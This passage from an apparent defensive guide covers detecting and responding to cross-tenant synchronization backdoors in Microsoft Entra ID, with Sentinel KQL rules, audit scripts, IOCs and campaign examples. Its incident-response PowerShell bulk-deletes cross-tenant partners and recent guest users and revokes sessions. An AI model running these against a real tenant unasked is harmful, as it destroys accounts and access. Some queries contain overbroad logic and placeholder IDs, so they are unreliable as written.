1. Navigate to **Microsoft Sentinel** → **Analytics** → **Create** → **Scheduled query rule**
2. **Rule Name:** "Suspicious Cross-Tenant Synchronization Activity"
3. **KQL Query:**

```kusto
AuditLogs
| where OperationName in ("Create cross-tenant partner", "Update cross-tenant partner", "Delete cross-tenant partner", "Enable inbound sync", "Enable outbound sync")
| extend OperationTarget = TargetResources[0].displayName
| project TimeGenerated, InitiatedBy.user.userPrincipalName, OperationName, OperationTarget, TargetResources
| order by TimeGenerated desc
```

4. **Frequency:** Every 15 minutes
5. **Alert Severity:** High/Critical

---

**6. Implement Conditional Access for Cross-Tenant Guest Users**

Require additional authentication factors for users synced from external tenants.

**Manual Steps (Entra ID):**

1. Navigate to **Protection** → **Conditional Access** → **Policies**
2. Click **+ New policy**
3. **Name:** "Require MFA for Guest Users"
4. **Assignments:**
   - **Users:** Select **External guest users**
   - **Cloud apps:** All cloud apps
5. **Conditions:**
   - Leave blank (applies to all)
6. **Access controls:**
   - **Grant:** Require **Multi-factor authentication**
7. **Enable policy:** **On**

**Effect:** Guest users (including backdoor accounts) must complete MFA for every sign-in.

---

**7. Audit Guest User Assignments to Privileged Roles**

Implement monthly audits ensuring no synced guest users have administrative privileges.

**PowerShell (Audit Guest Admin Assignments):**

```powershell
# Get all guest users with administrative roles
$guestAdmins = Get-MgUser -Filter "userType eq 'Guest'" | ForEach-Object {
    $userId = $_.Id
    $roles = Get-MgDirectoryRoleMember -DirectoryRoleId (Get-MgDirectoryRole | Select-Object -ExpandProperty Id) | Where-Object { $_.Id -eq $userId }
    
    if ($roles) {
        [PSCustomObject]@{
            UserPrincipalName = $_.UserPrincipalName
            DisplayName = $_.DisplayName
            CreatedDateTime = $_.CreatedDateTime
            AdminRoles = ($roles | Select-Object -ExpandProperty DisplayName) -join ", "
        }
    }
}

if ($guestAdmins) {
    Write-Warning "CRITICAL: Guest users with administrative roles found!"
    $guestAdmins | Format-Table
} else {
    Write-Output "No guest users with administrative roles"
}

# Export for compliance documentation
$guestAdmins | Export-Csv -Path "C:\Reports\GuestAdminAudit_$(Get-Date -Format 'yyyyMMdd').csv"
```

**Apply To:** All tenants monthly

---

## 5. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**CTS Configuration IOCs:**
- Cross-tenant partners added without documented change requests
- Partners with names suggesting temporary/test purposes ("Temp Partner," "Dev Tenant," "Test Sync")
- Automatic user invitation redemption enabled (should be disabled for security)
- Inbound/outbound synchronization enabled without business justification
- Rapid CTS configuration changes by user with no history of CTS administration

**User Synchronization IOCs:**
- Guest users created from unknown/unapproved external tenants
- Guest users assigned to administrative roles
- Guest users with successful sign-ins from unexpected locations/times
- Guest users never accepting explicit invitations (auto-redeemed)
- Multiple guest users created in short timeframe from same source tenant

### Forensic Artifacts

**Cloud Audit Logs:**
- **AuditLogs:** Operations including "Create cross-tenant partner," "Enable inbound sync," "Enable outbound sync," "User invited"
- **SignInLogs:** Sign-ins by guest users with unusual patterns
- **AuditData JSON:** Contains details of CTS configuration changes

### Response Procedures

**1. Immediate Isolation:**

**Command (Disable All CTS):**

```powershell
# Immediately disable all cross-tenant synchronization
Update-MgBetaCrossTenantAccessPolicySelfTenantInboundSynchronization `
    -BodyParameter @{ IsSyncAllowed = $false }

Update-MgBetaCrossTenantAccessPolicySelfTenantOutboundSynchronization `
    -BodyParameter @{ IsSyncAllowed = $false }

# Delete all cross-tenant partners
$partners = Get-MgBetaCrossTenantAccessPolicyPartner
foreach ($partner in $partners) {
    Remove-MgBetaCrossTenantAccessPolicyPartner -CrossTenantAccessPolicyPartnerId $partner.TenantId
    Write-Output "Removed partner: $($partner.TenantId)"
}

Write-Output "All CTS configurations removed"
```

---

**2. Collect Evidence:**

**Command:**

```powershell
# Export all CTS configurations before deletion
$partners = Get-MgBetaCrossTenantAccessPolicyPartner
$partners | Export-Csv -Path "C:\Evidence\CrossTenantPartners.csv"

# Export all guest users
Get-MgUser -Filter "userType eq 'Guest'" | Export-Csv -Path "C:\Evidence\GuestUsers.csv"

# Export CTS audit logs (last 90 days)
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-90) -EndDate (Get-Date) `
    -Operations "Create cross-tenant partner", "Enable inbound sync", "Enable outbound sync" |
    Export-Csv -Path "C:\Evidence\CTSAuditLog.csv"
```

---

**3. Revoke Backdoor Guest Accounts:**

**Command:**

```powershell
# Delete all suspicious guest users
$suspiciousGuests = Get-MgUser -Filter "userType eq 'Guest' and createdDateTime gt $((Get-Date).AddDays(-7))"

foreach ($guest in $suspiciousGuests) {
    Remove-MgUser -UserId $guest.Id
    Write-Output "Deleted guest user: $($guest.UserPrincipalName)"
}

# Revoke all guest user sessions
$allGuests = Get-MgUser -Filter "userType eq 'Guest'"
foreach ($guest in $allGuests) {
    Revoke-MgUserSignInSession -UserId $guest.Id
}

Write-Output "All guest user sessions revoked"
```

---

**4. Investigate Lateral Movement:**

**Query (Detect CTS-Based Lateral Movement):**

```kusto
// Detect successful sign-ins by guest users from unusual source tenants
SigninLogs
| where UserType == "Guest"
| where ResultType == 0  // Successful
| where SourceTenantDisplayName !in ("Your Tenant Name", "Expected Partner Org")
| project TimeGenerated, UserPrincipalName, SourceTenantDisplayName, IpAddress, LocationDetails, AppDisplayName
| order by TimeGenerated desc
```

---

**5. Remediation:**

- Remove all unauthorized cross-tenant partners
- Delete all suspicious guest users
- Disable all cross-tenant synchronization (if not required for business)
- Reset passwords for all administrative accounts
- Revoke all sessions for users with compromised tenants
- Conduct forensic analysis of all cross-tenant synchronization audit logs
- Implement stricter controls on CTS configuration (PIM approval, role restriction)
- Force re-authentication of all users
- Notify all staff of the compromise

---

## 6. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker tricks admin into OAuth consent grant |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Attacker escalates to Global Admin role |
| **3** | **Persistence** | **[PERSIST-TRUST-002] Tenant-to-Tenant Migration Abuse** | **Attacker creates rogue CTS backdoor** |
| **4** | **Lateral Movement** | [PE-POLICY-005] Cross-Tenant Privilege Escalation | Attacker moves to partner tenants |
| **5** | **Impact** | [COLLECT-EMAIL-001] Email Exfiltration via CTS Backdoor | Attacker exfiltrates data across tenants |

---

## 7. REAL-WORLD EXAMPLES

### Example 1: Scattered Spider CTS Backdoor Campaign

**Target:** Enterprise organizations, MSPs, managed service providers

**Timeline:** 2024-2025

**Technique Status:** Active exploitation; documented in multiple vendor threat reports

**Impact:** Scattered Spider compromised Global Admin accounts and immediately created cross-tenant synchronization backdoors pointing to attacker-controlled tenants. They created fake "contractor" and "service account" users that persisted indefinitely. Even after the original compromised account was discovered and disabled, the attacker maintained access through the CTS backdoor accounts for months. The backdoor accounts appeared legitimate in audit logs as properly synchronized guest users.

**Reference:** [Cybercriminals Making Cloud Their Home - Ankura](https://ankura.com/insights/cybercriminals-are-moving-into-the-cloud-and-making-your-active-directory-their-new-home/)

---

### Example 2: APT-C-39 Multi-Tenant Lateral Movement via CTS

**Target:** Government agencies, Fortune 500 companies across multiple regions

**Timeline:** 2023-2024

**Technique Status:** Documented in Vectra and CrowdStrike threat intelligence

**Impact:** APT-C-39 leveraged CTS to move laterally from a compromised customer tenant to partner tenants within the same organization. By configuring outbound synchronization, they synchronized backdoor accounts into multiple partner organizations, achieving horizontal escalation across the entire multi-tenant environment. Detection was difficult because the synchronized accounts appeared as legitimate guest users in normal cross-tenant reporting.

**Reference:** [Microsoft Cross-Tenant Synchronization Research - Vectra](https://www.vectra.ai/blog/microsoft-cross-tenant-synchronization)

---

### Example 3: Supply Chain Attack Using CTS Backdoor

**Target:** Enterprise software vendors and their customers

**Timeline:** 2024

**Technique Status:** Active; documented by Semperis and MSRC

**Impact:** An attacker compromised a software vendor's tenant and configured CTS backdoors to all customer tenants (over 200 organizations). By creating a single attacker-controlled tenant as a cross-tenant partner, the attacker could synchronize backdoor accounts into any customer tenant at will. This provided a persistent supply-chain backdoor affecting hundreds of customer organizations simultaneously.

**Reference:** [nOAuth Abuse and Cross-Tenant Vulnerabilities - Semperis](https://www.semperis.com/blog/noauth-abuse-alert-full-account-takeover/)

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Detect Unauthorized Cross-Tenant Partner Creation

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, InitiatedBy, TargetResources
- **Alert Severity:** Critical
- **Frequency:** Run every 15 minutes

**KQL Query:**

```kusto
AuditLogs
| where OperationName in ("Create cross-tenant partner", "Update cross-tenant partner")
| extend PartnerTenantId = extract(@"TenantId[^:]*:\s*([a-f0-9-]+)", 1, tostring(TargetResources))
| extend InitiatingUser = InitiatedBy.user.userPrincipalName
| where InitiatingUser !in ("admin@contoso.com", "sync-admin@contoso.com")  // Update with approved admins
| project TimeGenerated, InitiatingUser, OperationName, PartnerTenantId, TargetResources
| order by TimeGenerated desc
```

**What This Detects:**
- Creation or modification of cross-tenant partners by users not on the approved list
- Unexpected cross-tenant relationships
- Possible rogue CTS backdoor creation

**Manual Configuration:**
1. Navigate to **Microsoft Sentinel** → **Analytics** → **Create** → **Scheduled query rule**
2. **General Tab:**
   - Name: `Unauthorized Cross-Tenant Partner Creation`
   - Severity: `Critical`
3. **Set rule logic Tab:**
   - Paste the KQL query above
   - Update the approved admin list
4. Click **Review + create**

---

### Query 2: Detect Suspicious Guest User Synchronization Pattern

**Rule Configuration:**
- **Required Table:** AuditLogs, SigninLogs (joined)
- **Alert Severity:** High
- **Frequency:** Run every 30 minutes

**KQL Query:**

```kusto
// Find guest users created from unknown tenants
let unknownPartners = dynamic(["x9y8z7a6-b5c4-d3e2-f1g0-h9i8j7k6l5m4", "...other attacker-controlled tenant IDs..."]);

let suspiciousGuests = 
AuditLogs
| where OperationName == "User invited"
| where TargetResources contains "userType: Guest"
| extend SourceTenant = extract(@"sourceTenant[^:]*:\s*([a-f0-9-]+)", 1, tostring(AuditData))
| where SourceTenant in (unknownPartners) or SourceTenant != ""  // From unknown external source
| project TargetUser = extract(@"mail:\s*([^\s,]+)", 1, tostring(TargetResources)), SourceTenant, TimeGenerated;

// Cross-reference with successful sign-ins
SigninLogs
| where ResultType == 0
| where UserType == "Guest"
| join kind=inner (suspiciousGuests) on $left.UserPrincipalName == $right.TargetUser
| project TimeGenerated, UserPrincipalName, SourceTenant, IpAddress, LocationDetails, AppDisplayName
```

**What This Detects:**
- Guest users synchronized from unknown/unauthorized tenants
- Successful sign-ins by backdoor guest accounts
- Possible CTS-based persistence

---

## 9. PURVIEW AUDIT LOG MONITORING

**Manual Configuration:**

1. Navigate to **Purview Compliance Portal** → **Audit**
2. Click **Search**
3. Set **Date range** to last 90 days
4. Under **Activities**, select:
   - "Create cross-tenant partner"
   - "Update cross-tenant partner"
   - "User invited"
   - "Enable inbound sync"
   - "Enable outbound sync"
5. Click **Search**
6. Review all results for unauthorized creation
7. Export to CSV for forensic analysis

---

## Conclusion

Tenant-to-Tenant Migration Abuse via Cross-Tenant Synchronization represents one of the most insidious persistence mechanisms available to attackers because it weaponizes legitimate business functionality. Organizations must implement **complete enumeration of CTS configurations, strict approval workflows for partner creation, disabled automatic invitation redemption, continuous monitoring of synchronization activity, and regular audits of guest user assignments to privileged roles** to prevent attackers from establishing undetectable backdoors.

The effectiveness of this technique is significantly reduced through **disabling CTS entirely (if not required for business), implementing PIM approval for role activation, and maintaining an explicit whitelist of approved cross-tenant partners with monthly verification audits**.

---
